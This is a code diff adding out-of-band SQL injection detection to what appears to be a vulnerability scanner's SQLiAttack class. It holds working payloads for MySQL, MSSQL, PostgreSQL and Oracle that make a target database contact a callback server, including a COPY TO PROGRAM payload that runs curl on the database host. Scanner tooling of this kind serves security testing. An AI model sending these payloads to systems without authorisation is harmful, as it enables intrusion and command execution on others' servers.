@@ -235,4 +235,38 @@ class SQLiAttack(BaseAttack):
                         })
                         break
 
+        # Phase 4: OOB SQL injection (only when OOB server is configured)
+        if self.oob and not self._should_stop():
+            token = self.oob.generate_token("sqli")
+            oob_url = f"{self.oob.public_url}/{token}"
+            oob_host = self.oob.public_url.replace("http://", "").replace("https://", "").rstrip("/")
+            oob_payloads = [
+                f"1 AND LOAD_FILE(0x{('//' + oob_host + '/' + token).encode().hex()})",
+                f"1; EXEC master..xp_dirtree '//{oob_host}/{token}'-- ",
+                f"1; COPY (SELECT '') TO PROGRAM 'curl {oob_url}'-- ",
+                f"1 UNION SELECT UTL_HTTP.REQUEST('{oob_url}') FROM dual-- ",
+            ]
+            console.print(f"  [dim][SQLi] OOB deneniyor ({oob_host})...[/dim]")
+            for oob_payload in oob_payloads:
+                if self._should_stop():
+                    break
+                await self._try_payload(
+                    method, url, param, oob_payload, as_header=is_header
+                )
+
+            await asyncio.sleep(2.0)
+            if self.oob.was_triggered(token):
+                info = self.oob.get_hit_info(token)
+                console.print(
+                    f"  [bold red][SQLi][/bold red] OOB callback! src={info.get('source_ip')}"
+                )
+                all_findings.append({
+                    "type": "sqli_oob",
+                    "value": (
+                        f"OOB SQL injection @ {url} {location} "
+                        f"— callback from {info.get('source_ip')}"
+                    ),
+                    "confidence": 0.90,
+                })
+
         return all_findings
